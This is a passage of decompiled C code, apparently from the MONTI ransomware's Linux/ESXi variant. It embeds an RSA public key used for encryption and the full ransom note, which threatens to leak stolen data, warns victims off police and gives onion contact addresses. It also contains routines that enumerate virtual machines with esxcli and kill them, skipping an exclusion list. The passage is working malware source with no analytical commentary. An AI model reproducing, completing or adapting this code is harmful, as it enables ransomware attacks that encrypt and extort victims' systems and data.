        int64_t v1 = BIO_new_mem_buf("-----BEGIN RSA PUBLIC KEY-----\nMIICCAKCAgEApzP/nvNpFaOUdLrT2i2TUBs2TyfP3l4TkLUAJpU8hUUwIwNOvuis\nWbBCr1jtTs88gqqXSGDMHs3A7BY7YPcLuLRklEZ/50Hqz7geTV/uCo8q7KZMzDHY\nFiK2HHklY+v4UY4ILOFJ/EK2xd/rIVgv2LerPd292sjaO8YqxjEt4vmeaI/8cEW4\ntpnkPjoWUTcWua9HUPg/joQJcSKlm3P+cJZ5LhkGmPtcf38AMj9ZJcM7k/Lx/RdQ\nA5+Hyz+l7jgPJwdFZBJ+HCi/hUL//EO2eJTXaqJDxEfncfVk6258nRo+4Sh2qUvp\nSTbQi6gslZdkPPH2ZgC5TZ4rcdUZgBMUs29N8v3nUFH1xjHFL3P6HG1lOUz5Py9P\nIMI0q41v5Id3vYd5c00HNJQM5PEKrEuafAibywHShT6JStpoAwo/I1j5zTMS2MP5\nFGaFHI0ErMvFR+1sVjCWMJfPBCQ3mDmSNMu2tdNdVVWrQ0WQ6WNaktCKhBzX9JJj\nk9Q6iLca8OyyznHyZzdrEgzqC/zTdnaG36fUk3gvboj+pEWipZ7A0zkRdixyOgh7\nUY4zwNinAXIRm2pTwioDuSKIHnPUnA885W2pz1nSJ9pLwoYE5AGh2PMTN9if32ge\nQr7kA1ZkW4CXJhMebbGcRFiWEdQZOirDzy1ouz3dMULArcU2iRIXiuMCAQM=\n-----END RSA PUBLIC KEY-----", 0x1000); // 0x42ffdb
        g218 = PEM_read_bio_RSAPublicKey(v1, 0, 0, 0);
        BIO_free_all(v1);
        int64_t v2 = g218; // 0x430012
        result = v2 & -256 | (int64_t)(v2 != 0);
    }
    // 0x43001f
    return result;
}

// Address range: 0x430021 - 0x43008f
// Demangled:     std::basic_string<char, std::char_traits<char>, std::allocator<char> > std::operator+<char, std::char_traits<char>, std::allocator<char> >(std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, char const*)
int64_t _ZStplIcSt11char_traitsIcESaIcEESbIT_T0_T1_ERKS6_PKS3_(int64_t * result, int64_t * a2, char * a3) {
    // 0x430021
    _ZNSsC1ERKSs(result);
    _ZNSs6appendEPKc((char *)result);
    return (int64_t)result;
}

// Address range: 0x430090 - 0x4300a5
// Demangled:     SetPath(char const*)
int64_t _Z7SetPathPKc(char * a1) {
    int64_t result = (int64_t)a1;
    g220 = result;
    return result;
}

// Address range: 0x4300a5 - 0x4300b2
// Demangled:     GetPath()
int64_t _Z7GetPathv(void) {
    // 0x4300a5
    return g220;
}

// Address range: 0x4300b2 - 0x4300c4
// Demangled:     SetSize(int)
int64_t _Z7SetSizei(uint32_t result) {
    // 0x4300b2
    g172 = result;
    return result;
}

// Address range: 0x4300d0 - 0x4300e5
// Demangled:     SetFile(char const*)
int64_t _Z7SetFilePKc(char * a1) {
    int64_t result = (int64_t)a1;
    g221 = result;
    return result;
}

// Address range: 0x4300f2 - 0x430107
// Demangled:     SetDetach(bool)
int64_t _Z9SetDetachb(bool a1) {
    int64_t result = a1 ? 255 : 0; // 0x4300fb
    g222 = result;
    return result;
}

// Address range: 0x430107 - 0x430114
// Demangled:     GetDetach()
int64_t _Z9GetDetachv(void) {
    // 0x430107
    return (unsigned char)g222;
}

// Address range: 0x430114 - 0x43011f
// Demangled:     GetDecryptNote()
int64_t _Z14GetDecryptNotev(void) {
    // 0x430114
    return (int64_t)"All of your files are currently encrypted by MONTI strain. If you don't know who we are - just \"Google it.\"\r\n\r\nAs you already know, all of your data has been encrypted by our software. \r\nIt cannot be recovered by any means without contacting our team directly.\r\n\r\nDON'T TRY TO RECOVER your data by yourselves. Any attempt to recover your data (including the usage of the additional recovery software) can damage your files. However,\r\nif you want to try - we recommend choosing the data of the lowest value.\r\n\r\nDON'T TRY TO IGNORE us. We've downloaded a pack of your internal data and are ready to publish it on our news website if you do not respond. \r\nSo it will be better for both sides if you contact us as soon as possible.\r\n\r\nDON'T TRY TO CONTACT feds or any recovery companies. \r\nWe have our informants in these structures, so any of your complaints will be immediately directed to us. \r\nSo if you will hire any recovery company for negotiations or send requests to the police/FBI/investigators, we will consider this as a hostile intent and initiate the publication of whole compromised data immediately.\r\n\r\nTo prove that we REALLY CAN get your data back - we offer you to decrypt two random files completely free of charge.\r\n\r\nYou can contact our team directly for further instructions through our website :\r\n\r\nTOR VERSION :\r\n(you should download and install TOR browser first https://torproject.org)\r\n\r\nhttp://monti5o7lvyrpyk26lqofnfvajtyqruwatlfaazgm3zskt3xiktudwid.onion/chat/c7c5b8b0703950c40e6614bf957f94c1/\r\n\r\nOur blog :\r\n(also through TOR)\r\n\r\nhttp://mblogci3rudehaagbryjznltdp33ojwzkq6hn2pckvjq33rycmzczpid.onion\r\n\r\nYOU SHOULD BE AWARE!\r\nWe will speak only with an authorized person. It can be the CEO, top management, etc. \r\nIn case you are not such a person - DON'T CONTACT US! Your decisions and action can result in serious harm to your company! \r\nInform your supervisors and stay calm!\r\n";
}

// Address range: 0x43011f - 0x430131
// Demangled:     SetProcKiller(bool)
int64_t _Z13SetProcKillerb(bool a1) {
    // 0x43011f
    g223 = 1;
    return a1 ? 0xffffffff : 0;
}

// Address range: 0x430140 - 0x430181
// Demangled:     LogInit(char const*)
int64_t _Z7LogInitPKc(char * file_path) {
    int64_t result = 0; // 0x430151
    if (file_path != NULL) {
        struct _IO_FILE * file = fopen(file_path, "a+"); // 0x430166
        g224 = file;
        result = (int64_t)file & -256 | (int64_t)(file != NULL);
    }
    // 0x43017f
    return result;
}

// Address range: 0x430181 - 0x4301c8
// Demangled:     LogPrintf(char const*, ...)
int64_t _Z9LogPrintfPKcz(char * a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    // 0x430181
    int64_t v1; // 0x430181
    return 0x4301e8 - (4 * v1 & 1020);
}

// Address range: 0x430268 - 0x430289
// Demangled:     LogClose()
int64_t _Z8LogClosev(void) {
    int64_t result = (int64_t)g224; // 0x430276
    if (g224 != NULL) {
        // 0x430278
        result = fclose(g224);
    }
    // 0x430287
    return result;
}

// Address range: 0x430755 - 0x43083c
// Demangled:     GetVMList()
int64_t _Z9GetVMListv(void) {
    int32_t v1 = fork(); // 0x43075d
    if (v1 < 0) {
        uint32_t v2 = *__errno_location(); // 0x430770
        // 0x43083a
        return printf("fork() error in GetVMList(). errno = %d\n", (int64_t)v2);
    }
    if (v1 != 0) {
        // 0x43083a
        return wait(0);
    }
    int32_t fd = open("vm-list.txt", 577); // 0x4307a6
    int32_t puts_rc; // 0x430755
    if (fd != -1) {
        int32_t fd2 = dup(1); // 0x4307c5
        dup2(fd, 1);
        execlp("esxcli", "esxcli");
        fflush(g215);
        dup2(fd2, 1);
        puts_rc = close(fd);
    } else {
        // 0x4307b4
        puts_rc = puts("Cannot create file vm-list.txt");
    }
    // 0x43083a
    return puts_rc;
}

// Address range: 0x43083c - 0x430902
// Demangled:     KillVm(int)
int64_t _Z6KillVmi(uint32_t a1) {
    int32_t v1 = fork(); // 0x43084d
    if (v1 < 0) {
        // 0x430900
        return printf("fork() error in KillVm(). errno = %d\n", (int64_t)*__errno_location());
    }
    int32_t result; // 0x43083c
    if (v1 != 0) {
        // 0x4308f6
        result = wait(0);
    } else {
        // 0x43087e
        int64_t str; // bp-152, 0x43083c
        memset(&str, 0, 128);
        sprintf((char *)&str, "--world-id=%d", (int64_t)a1);
        result = execlp("esxcli", "esxcli");
    }
    // 0x430900
    return result;
}

// Address range: 0x430902 - 0x430bfd
// Demangled:     KillVirtualMachines()
int64_t _Z19KillVirtualMachinesv(int64_t a1, int64_t a2, int64_t a3) {
    // 0x430902
    _Z9GetVMListv();
    struct _IO_FILE * file = fopen("vm-list.txt", "r"); // 0x430927
    if (file == NULL) {
        // 0x430bf1
        return puts("Cannot open file vm-list.txt");
    }
    int64_t * mem = malloc(0x2000); // 0x43094d
    if (mem == NULL) {
        // 0x43095d
        puts("Cannot alloc memory");
        // 0x430bf1
        return fclose(file);
    }
    // 0x430978
    _ZNSsC1Ev();
    memset(mem, 0, 0x2000);
    if (fread(mem, 1, 0x2000, file) != 0) {
        int64_t v1; // bp-88, 0x430902
        _ZNSspLEPKc((char *)&v1);
        memset(mem, 0, 0x2000);
        while (fread(mem, 1, 0x2000, file) != 0) {
            // 0x43099b
            _ZNSspLEPKc((char *)&v1);
            memset(mem, 0, 0x2000);
        }
    }
    char * str = (char *)_ZNKSs5c_strEv(); // 0x4309f2
    char * substr_pos = strstr(str, "World ID:"); // 0x430b93
    char * str4; // 0x430902
    char * v2; // 0x430902
    char * str5; // 0x430902
    if (substr_pos != NULL) {
        // 0x430a03
        int64_t v3; // bp-376, 0x430902
        int64_t v4 = &v3;
        str4 = str;
        v2 = substr_pos;
        while (true) {
          lab_0x430a03:
            // 0x430a03
            __asm_rep_stosq_memset((char *)&v3, 0, 32);
            int64_t str2 = (int64_t)v2 + 10; // 0x430a21
            int64_t str3 = 0; // bp-120, 0x430a26
            char * substr_pos2 = strstr((char *)str2, "\n"); // 0x430a4a
            memcpy(&str3, (int64_t *)str2, (int32_t)((int64_t)substr_pos2 - str2));
            int32_t str_as_i = atoi((char *)&str3); // 0x430a7c
            int64_t v5 = (int64_t)strstr(str4, "Display Name: ") + 14; // 0x430a99
            str5 = (char *)v5;
            char * substr_pos3 = strstr(str5, "\n"); // 0x430aaa
            memcpy(&v3, (int64_t *)v5, (int32_t)((int64_t)substr_pos3 - v5));
            if (_ZNKSt6vectorISsSaISsEE4sizeEv(&g225) != 0) {
                _ZNSt6vectorISsSaISsEEixEm(&g225, 0);
                int64_t v6 = _ZNKSs5c_strEv(); // 0x430af6
                int32_t v7 = 0; // 0x430b14
                if ((int32_t)function_42e6b0(v6, v4, v4) == 0) {
                    // 0x430b16
                    printf("Skipping VM %s\n", &v3);
                    v7 = 1;
                }
                int32_t v8 = v7;
                int32_t v9 = 1; // 0x430b33
                int64_t v10 = v9; // 0x430b3a
                uint64_t v11 = _ZNKSt6vectorISsSaISsEE4sizeEv(&g225); // 0x430b42
                int64_t v12 = v10; // 0x430b4f
                int32_t v13 = v9; // 0x430b4f
                int32_t v14 = v8; // 0x430b4f
                while (v11 > v10) {
                    // 0x430ae1
                    _ZNSt6vectorISsSaISsEEixEm(&g225, v12);
                    v6 = _ZNKSs5c_strEv();
                    v7 = v14;
                    if ((int32_t)function_42e6b0(v6, v4, v4) == 0) {
                        // 0x430b16
                        printf("Skipping VM %s\n", &v3);
                        v7 = 1;
                    }
                    // 0x430b33
                    v8 = v7;
                    v9 = v13 + 1;
                    v10 = v9;
                    v11 = _ZNKSt6vectorISsSaISsEE4sizeEv(&g225);
                    v12 = v10;
                    v13 = v9;
                    v14 = v8;
                }
                if ((char)v8 == 1) {
                    goto lab_0x430b87;
                } else {
                    // 0x430b64
                    printf("Killing VM %s\n", &v3);
                    _Z6KillVmi(str_as_i);
                    goto lab_0x430b87;
                }
            } else {
                // 0x430b64
                printf("Killing VM %s\n", &v3);
                _Z6KillVmi(str_as_i);
                goto lab_0x430b87;
            }
        }
    }
  lab_0x430bac:
    // 0x430bac
    fclose(file);
    free(mem);
    // 0x430bf1
    return _ZNSsD1Ev();
  lab_0x430b87:;
    char * substr_pos4 = strstr(str5, "World ID:"); // 0x430b93
    str4 = str5;
    v2 = substr_pos4;
    if (substr_pos4 == NULL) {
        // break -> 0x430bac
        goto lab_0x430bac;
    }
    goto lab_0x430a03;
}

// Address range: 0x430bfd - 0x430d64
// Demangled:     SetVmList(char const*)
int64_t _Z9SetVmListPKc(int64_t * this, int64_t * result, char * a3) {
    struct _IO_FILE * file = fopen((char *)this, "r"); // 0x430c21
    if (file == NULL) {
        // 0x430d58
        return printf("Cannot open file %s\n", this);
    }
    // 0x430c4f
    int64_t str; // bp-1080, 0x430bfd
    __asm_rep_stosq_memset((char *)&str, 0, 128);
    if (fgets((char *)&str, 1024, file) == NULL) {
        // 0x430d58
        return fclose(file);
    }
    int64_t v1; // bp-56, 0x430bfd
    int64_t v2; // bp-8, 0x430bfd
    int32_t len; // 0x430c8a
    if ((char)str != 0) {
        // 0x430c80
        len = strlen((char *)&str);
        *(char *)((int64_t)&v2 - 1073 + (int64_t)len) = 0;
        _ZNSaIcEC1Ev();
        _ZNSsC1EPKcRKSaIcE((char *)&v1, &str);
        _ZNSt6vectorISsSaISsEE9push_backEOSs(&g225, &v1);
        _ZNSsD1Ev();
        _ZNSaIcED1Ev();
    }
    // 0x430c6e
    while (fgets((char *)&str, 1024, file) != NULL) {
        // 0x430c6e
        if ((char)str != 0) {
            // 0x430c80
            len = strlen((char *)&str);
            *(char *)((int64_t)&v2 - 1073 + (int64_t)len) = 0;
            _ZNSaIcEC1Ev();
            _ZNSsC1EPKcRKSaIcE((char *)&v1, &str);
            _ZNSt6vectorISsSaISsEE9push_backEOSs(&g225, &v1);
            _ZNSsD1Ev();
            _ZNSaIcED1Ev();
        }
    }
    // 0x430d58
    return fclose(file);
}

// Address range: 0x430db9 - 0x430dcb
// Demangled:     operator new(unsigned long, void*)
int64_t _ZnwmPv(int64_t a1, int64_t * a2) {
    // 0x430db9
    return (int64_t)a2;
}

// Address range: 0x430dcb - 0x430dd9
// Demangled:     operator delete(void*, void*)
int64_t _ZdlPvS_(int64_t * a1, int64_t * a2) {
    // 0x430dcb
    int64_t result; // 0x430dcb
    return result;
}

// Address range: 0x430df4 - 0x430e1d
// Demangled:     std::vector<std::string, std::allocator<std::string> >::size() const
int64_t _ZNKSt6vectorISsSaISsEE4sizeEv(int64_t * result) {
    int64_t v1 = (int64_t)result;
    return (*(int64_t *)(v1 + 8) - v1) / 8;
}

// Address range: 0x430e1e - 0x430e3e
// Demangled:     std::vector<std::string, std::allocator<std::string> >::operator[](unsigned long)
int64_t _ZNSt6vectorISsSaISsEEixEm(int64_t * result, int64_t a2) {
    // 0x430e1e
    return 8 * a2 + (int64_t)result;
}

// Address range: 0x430e3e - 0x430e6e
// Demangled:     std::vector<std::string, std::allocator<std::string> >::push_back(std::string&&)
int64_t _ZNSt6vectorISsSaISsEE9push_backEOSs(int64_t * result, int64_t * a2) {
    // 0x430e3e
    return _ZNSt6vectorISsSaISsEE12emplace_backIISsEEEvDpOT_((int64_t)result, (int64_t)_ZSt4moveIRSsEONSt16remove_referenceIT_E4typeEOS2_((int64_t **)a2));
}

// Address range: 0x430f1f - 0x430f2d
// Demangled:     std::remove_reference<std::string&>::type&& std::move<std::string&>(std::string&)
int64_t * _ZSt4moveIRSsEONSt16remove_referenceIT_E4typeEOS2_(int64_t ** a1) {
    // 0x430f1f
    return (int64_t *)a1;
}

// Address range: 0x430f2e - 0x430fc7
int64_t _ZNSt6vectorISsSaISsEE12emplace_backIISsEEEvDpOT_(int64_t a1, int64_t a2) {
    int64_t * v1 = (int64_t *)(a1 + 8); // 0x430f43
    int64_t v2 = (int64_t)_ZSt7forwardISsEOT_ONSt8identityIS0_E4typeE((int64_t *)a2);
    int64_t result; // 0x430f2e
    if (*v1 == *(int64_t *)(a1 + 16)) {
        // 0x430f90
        result = _ZNSt6vectorISsSaISsEE13_M_insert_auxIISsEEEvN9__gnu_cxx17__normal_iteratorIPSsS1_EEDpOT_(a1, _ZNSt6vectorISsSaISsEE3endEv((int64_t *)a1), v2);
    } else {
        // 0x430f54
        _ZN9__gnu_cxx13new_allocatorISsE9constructIISsEEEvPSsDpOT_(a1, *v1, v2);
        *v1 = *v1 + 8;
        result = a1;
    }
    // 0x430fc0
    return result;
}

// Address range: 0x431020 - 0x431054
// Demangled:     std::_Vector_base<std::string, std::allocator<std::string> >::_M_deallocate(std::string*, unsigned long)
int64_t _ZNSt12_Vector_baseISsSaISsEE13_M_deallocateEPSsm(int64_t * result, int64_t * a2, int64_t a3) {
    int64_t result2; // 0x431020
    if (a2 != NULL) {
        // 0x43103b
        result2 = _ZN9__gnu_cxx13new_allocatorISsE10deallocateEPSsm(result, a2, a3);
    }
    // 0x431052
    return result2;
}

// Address range: 0x431054 - 0x431062
// Demangled:     std::string&& std::forward<std::string>(std::identity<std::string>::type&&)
int64_t * _ZSt7forwardISsEOT_ONSt8identityIS0_E4typeE(int64_t * result) {
    // 0x431054
    return result;
}

// Address range: 0x431062 - 0x4310e4
int64_t _ZN9__gnu_cxx13new_allocatorISsE9constructIISsEEEvPSsDpOT_(int64_t a1, int64_t a2, int64_t a3) {
    // 0x431062
    _ZSt7forwardISsEOT_ONSt8identityIS0_E4typeE((int64_t *)a3);
    int64_t v1 = _ZnwmPv(8, (int64_t *)a2); // 0x431098
    int64_t result = 0; // 0x4310a6
    if (v1 != 0) {
        // 0x4310a8
        result = _ZNSsC1ERKSs((int64_t *)v1);
    }
    // 0x4310d7
    return result;
}

// Address range: 0x4310e4 - 0x43110d
// Demangled:     std::vector<std::string, std::allocator<std::string> >::end()
int64_t _ZNSt6vectorISsSaISsEE3endEv(int64_t * result) {
    // 0x4310e4
    int64_t result2; // bp-24, 0x4310e4
    _ZN9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEEC1ERKS1_(&result2, (int64_t **)((int64_t)result + 8));
    return result2;
}

// Address range: 0x43110e - 0x431453
int64_t _ZNSt6vectorISsSaISsEE13_M_insert_auxIISsEEEvN9__gnu_cxx17__normal_iteratorIPSsS1_EEDpOT_(int64_t a1, int64_t a2, int64_t a3) {
    int64_t v1 = a2; // bp-104, 0x43111d
    int64_t * v2 = (int64_t *)(a1 + 8); // 0x431129
    int64_t v3 = *v2; // 0x431129
    int64_t * v4 = (int64_t *)(a1 + 16); // 0x431131
    int64_t result; // 0x43110e
    if (v3 == *v4) {
        int64_t * v5 = (int64_t *)a1; // 0x431231
        int64_t v6 = _ZNKSt6vectorISsSaISsEE12_M_check_lenEmPKc(v5, 1, "vector::_M_insert_aux"); // 0x431231
        int64_t v7 = _ZNSt6vectorISsSaISsEE5beginEv(v5); // bp-72, 0x431246
        int64_t v8 = _ZN9__gnu_cxxmiIPSsSt6vectorISsSaISsEEEENS_17__normal_iteratorIT_T0_E15difference_typeERKS8_SB_(&v1, &v7); // 0x431258
        int64_t v9 = _ZNSt12_Vector_baseISsSaISsEE11_M_allocateEm(v5, v6); // 0x43126f
        _ZN9__gnu_cxx13new_allocatorISsE9constructIISsEEEvPSsDpOT_(a1, 8 * v8 + v9, (int64_t)_ZSt7forwardISsEOT_ONSt8identityIS0_E4typeE((int64_t *)a3));
        int64_t v10 = _ZNSt12_Vector_baseISsSaISsEE19_M_get_Tp_allocatorEv(v5); // 0x4312bc
        int64_t v11 = *(int64_t *)_ZNK9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEE4baseEv(&v1); // 0x4312d0
        int64_t * v12 = _ZSt22__uninitialized_move_aIPSsS0_SaISsEET0_T_S3_S2_RT1_(&v1, (int64_t *)v11, (int64_t *)v9, (int64_t *)v10); // 0x4312e7
        int64_t v13 = _ZNSt12_Vector_baseISsSaISsEE19_M_get_Tp_allocatorEv(v5); // 0x4312fc
        int64_t v14 = *v2; // 0x431308
        int64_t v15 = *(int64_t *)_ZNK9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEE4baseEv(&v1); // 0x431318
        int64_t * v16 = _ZSt22__uninitialized_move_aIPSsS0_SaISsEET0_T_S3_S2_RT1_((int64_t *)v15, (int64_t *)v14, (int64_t *)((int64_t)v12 + 8), (int64_t *)v13); // 0x431328
        int64_t v17 = _ZNSt12_Vector_baseISsSaISsEE19_M_get_Tp_allocatorEv(v5); // 0x431338
        _ZSt8_DestroyIPSsSsEvT_S1_RSaIT0_E(v5, (int64_t *)*v2, (int64_t *)v17);
        _ZNSt12_Vector_baseISsSaISsEE13_M_deallocateEPSsm(v5, v5, (*v4 - a1) / 8);
        *v5 = v9;
        *v2 = (int64_t)v16;
        *v4 = v9 + 8 * v6;
        result = a1;
    } else {
        int64_t * v18 = _ZSt4moveIRSsEONSt16remove_referenceIT_E4typeEOS2_((int64_t **)(v3 - 8)); // 0x43114d
        _ZN9__gnu_cxx13new_allocatorISsE9constructIISsEEEvPSsDpOT_(a1, *v2, (int64_t)v18);
        int64_t v19 = *v2; // 0x431170
        *v2 = v19 + 8;
        int64_t v20 = *(int64_t *)_ZNK9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEE4baseEv(&v1); // 0x4311a4
        _ZSt13move_backwardIPSsS0_ET0_T_S2_S1_((int64_t *)v20, (int64_t *)(v19 - 8), (int64_t *)v19);
        _ZSt7forwardISsEOT_ONSt8identityIS0_E4typeE((int64_t *)a3);
        int64_t v21; // bp-88, 0x43110e
        _ZNSsC1ERKSs(&v21);
        _ZNSsaSERKSs((int64_t *)_ZNK9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEEdeEv(&v1));
        result = _ZNSsD1Ev();
    }
    // 0x43144a
    return result;
}

// Address range: 0x431478 - 0x43149a
// Demangled:     __gnu_cxx::new_allocator<std::string>::deallocate(std::string*, unsigned long)
int64_t _ZN9__gnu_cxx13new_allocatorISsE10deallocateEPSsm(int64_t * result, int64_t * a2, int64_t a3) {
    // 0x431478
    _ZdlPv(a2);
    return &g299;
}

// Address range: 0x43149a - 0x4314b6
// Demangled:     __gnu_cxx::__normal_iterator<std::string*, std::vector<std::string, std::allocator<std::string> > >::__normal_iterator(std::string* const&)
int64_t _ZN9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEEC1ERKS1_(int64_t * result, int64_t ** a2) {
    // 0x43149a
    *result = (int64_t)a2;
    return (int64_t)result;
}

// Address range: 0x4314b6 - 0x4314c4
// Demangled:     __gnu_cxx::__normal_iterator<std::string*, std::vector<std::string, std::allocator<std::string> > >::base() const
int64_t _ZNK9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEE4baseEv(int64_t * result) {
    // 0x4314b6
    return (int64_t)result;
}

// Address range: 0x4314c4 - 0x43150a
// Demangled:     std::string* std::move_backward<std::string*, std::string*>(std::string*, std::string*, std::string*)
int64_t * _ZSt13move_backwardIPSsS0_ET0_T_S2_S1_(int64_t * a1, int64_t * a2, int64_t * a3) {
    int64_t v1 = _ZNSt12__miter_baseIPSsLb0EE3__bES0_(a2); // 0x4314e0
    return _ZSt23__copy_move_backward_a2ILb1EPSsS0_ET1_T0_S2_S1_((int64_t *)_ZNSt12__miter_baseIPSsLb0EE3__bES0_(a1), (int64_t *)v1, a3);
}

// Address range: 0x43150a - 0x43151b
// Demangled:     __gnu_cxx::__normal_iterator<std::string*, std::vector<std::string, std::allocator<std::string> > >::operator*() const
int64_t _ZNK9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEEdeEv(int64_t * result) {
    // 0x43150a
    return (int64_t)result;
}

// Address range: 0x43151c - 0x4315e6
// Demangled:     std::vector<std::string, std::allocator<std::string> >::_M_check_len(unsigned long, char const*) const
int64_t _ZNKSt6vectorISsSaISsEE12_M_check_lenEmPKc(int64_t * result, uint64_t a2, char * a3) {
    int64_t v1 = a2; // bp-56, 0x431529
    int64_t v2 = _ZNKSt6vectorISsSaISsEE8max_sizeEv(result); // 0x431538
    if (v2 - _ZNKSt6vectorISsSaISsEE4sizeEv(result) < a2) {
        // 0x431560
        _ZSt20__throw_length_errorPKc(a3);
    }
    int64_t v3 = _ZNKSt6vectorISsSaISsEE4sizeEv(result); // 0x431573
    int64_t v4 = _ZNKSt6vectorISsSaISsEE4sizeEv(result); // bp-40, 0x431587
    uint64_t result2 = *_ZSt3maxImERKT_S2_S2_(&v4, &v1) + v3; // 0x4315a1
    if (_ZNKSt6vectorISsSaISsEE4sizeEv(result) > result2) {
        // 0x4315df
        return _ZNKSt6vectorISsSaISsEE8max_sizeEv(result);
    }
    // 0x4315bb
    if (_ZNKSt6vectorISsSaISsEE8max_sizeEv(result) >= result2) {
        // 0x4315df
        return result2;
    }
    // 0x4315df
    return _ZNKSt6vectorISsSaISsEE8max_sizeEv(result);
}

// Address range: 0x4315e6 - 0x43160b
// Demangled:     std::vector<std::string, std::allocator<std::string> >::begin()
int64_t _ZNSt6vectorISsSaISsEE5beginEv(int64_t * result) {
    // 0x4315e6
    int64_t result2; // bp-24, 0x4315e6
    _ZN9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEEC1ERKS1_(&result2, (int64_t **)result);
    return result2;
}

// Address range: 0x43160b - 0x431651
// Demangled:     __gnu_cxx::__normal_iterator<std::string*, std::vector<std::string, std::allocator<std::string> > >::difference_type __gnu_cxx::operator-<std::string*, std::vector<std::string, std::allocator<std::string> > >(__gnu_cxx::__normal_iterator<std::string*, std::vector<std::string, std::allocator<std::string> > > const&, __gnu_cxx::__normal_iterator<std::string*, std::vector<std::string, std::allocator<std::string> > > const&)
int64_t _ZN9__gnu_cxxmiIPSsSt6vectorISsSaISsEEEENS_17__normal_iteratorIT_T0_E15difference_typeERKS8_SB_(int64_t * a1, int64_t * a2) {
    int64_t v1 = *(int64_t *)_ZNK9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEE4baseEv(a1); // 0x431628
    return (v1 - *(int64_t *)_ZNK9__gnu_cxx17__normal_iteratorIPSsSt6vectorISsSaISsEEE4baseEv(a2)) / 8;
}

// Address range: 0x431652 - 0x43168a
// Demangled:     std::_Vector_base<std::string, std::allocator<std::string> >::_M_allocate(unsigned long)
int64_t _ZNSt12_Vector_baseISsSaISsEE11_M_allocateEm(int64_t * result, int64_t a2) {
    int64_t result2 = 0; // 0x431667
    if (a2 != 0) {
        // 0x431669
        result2 = _ZN9__gnu_cxx13new_allocatorISsE8allocateEmPKv(result, a2, NULL);
    }
    // 0x431688
    return result2;
}

// Address range: 0x43168a - 0x431698
// Demangled:     std::_Vector_base<std::string, std::allocator<std::string> >::_M_get_Tp_allocator()
int64_t _ZNSt12_Vector_baseISsSaISsEE19_M_get_Tp_allocatorEv(int64_t * result) {
    // 0x43168a
    return (int64_t)result;
}

// Address range: 0x431698 - 0x4316e6
// Demangled:     std::string* std::__uninitialized_move_a<std::string*, std::string*, std::allocator<std::string> >(std::string*, std::string*, std::string*, std::allocator<std::string>&)
int64_t * _ZSt22__uninitialized_move_aIPSsS0_SaISsEET0_T_S3_S2_RT1_(int64_t * a1, int64_t * a2, int64_t * a3, int64_t * a4) {
    int64_t v1 = (int64_t)a1; // bp-32, 0x4316a1
    int64_t v2 = (int64_t)a2; // bp-40, 0x4316a5
    int64_t v3 = _ZSt18make_move_iteratorIPSsESt13move_iteratorIT_ERKS2_((int64_t **)&v2); // 0x4316b8
    int64_t v4 = _ZSt18make_move_iteratorIPSsESt13move_iteratorIT_ERKS2_((int64_t **)&v1); // 0x4316c7
    return _ZSt22__uninitialized_copy_aISt13move_iteratorIPSsES1_SsET0_T_S4_S3_RSaIT1_E(v4, v3, a3, a4);
}

// Address range: 0x4316e6 - 0x431704
// Demangled:     __gnu_cxx::new_allocator<std::string>::destroy(std::string*)
int64_t _ZN9__gnu_cxx13new_allocatorISsE7destroyEPSs(int64_t * result, int64_t * a2) {
    // 0x4316e6
    return _ZNSsD1Ev();
}

// Address range: 0x431704 - 0x43172d
// Demangled:     void std::_Destroy<std::string*, std::string>(std::string*, std::string*, std::allocator<std::string>&)
void _ZSt8_DestroyIPSsSsEvT_S1_RSaIT0_E(int64_t * a1, int64_t * a2, int64_t * a3) {
    // 0x431704
    _ZSt8_DestroyIPSsEvT_S1_(a1, a2);
}

// Address range: 0x431738 - 0x431746
// Demangled:     std::__miter_base<std::string*, false>::__b(std::string*)
int64_t _ZNSt12__miter_baseIPSsLb0EE3__bES0_(int64_t * a1) {
    // 0x431738
    return (int64_t)a1;
}

// Address range: 0x431746 - 0x43179e
// Demangled:     std::string* std::__copy_move_backward_a2<true, std::string*, std::string*>(std::string*, std::string*, std::string*)
int64_t * _ZSt23__copy_move_backward_a2ILb1EPSsS0_ET1_T0_S2_S1_(int64_t * a1, int64_t * a2, int64_t * a3) {
    int64_t v1 = _ZNSt12__niter_baseIPSsLb0EE3__bES0_(a3); // 0x431764
    int64_t v2 = _ZNSt12__niter_baseIPSsLb0EE3__bES0_(a2); // 0x431773
    return _ZSt22__copy_move_backward_aILb1EPSsS0_ET1_T0_S2_S1_((int64_t *)_ZNSt12__niter_baseIPSsLb0EE3__bES0_(a1), (int64_t *)v2, (int64_t *)v1);
}

// Address range: 0x43179e - 0x4317c0
// Demangled:     std::vector<std::string, std::allocator<std::string> >::max_size() const
int64_t _ZNKSt6vectorISsSaISsEE8max_sizeEv(int64_t * result) {
    // 0x43179e
    return _ZNK9__gnu_cxx13new_allocatorISsE8max_sizeEv((int64_t *)_ZNKSt12_Vector_baseISsSaISsEE19_M_get_Tp_allocatorEv(result));
}

// Address range: 0x4317c0 - 0x4317eb
// Demangled:     unsigned long const& std::max<unsigned long>(unsigned long const&, unsigned long const&)
int64_t * _ZSt3maxImERKT_S2_S2_(int64_t * a1, int64_t * a2) {
    // 0x4317c0
    return a1 >= a2 ? a1 : a2;
}

// Address range: 0x4317ec - 0x431837
// Demangled:     __gnu_cxx::new_allocator<std::string>::allocate(unsigned long, void const*)
int64_t _ZN9__gnu_cxx13new_allocatorISsE8allocateEmPKv(int64_t * result, uint64_t a2, int64_t * a3) {
    // 0x4317ec
    if ((uint64_t)_ZNK9__gnu_cxx13new_allocatorISsE8max_sizeEv(result) < a2) {
        // 0x431820
        _ZSt17__throw_bad_allocv();
    }
    // 0x431825
    return _Znwm(8 * a2);
}

// Address range: 0x431837 - 0x43185f
// Demangled:     std::move_iterator<std::string*> std::make_move_iterator<std::string*>(std::string* const&)
int64_t _ZSt18make_move_iteratorIPSsESt13move_iteratorIT_ERKS2_(int64_t ** a1) {
    // 0x431837
    int64_t result; // bp-24, 0x431837
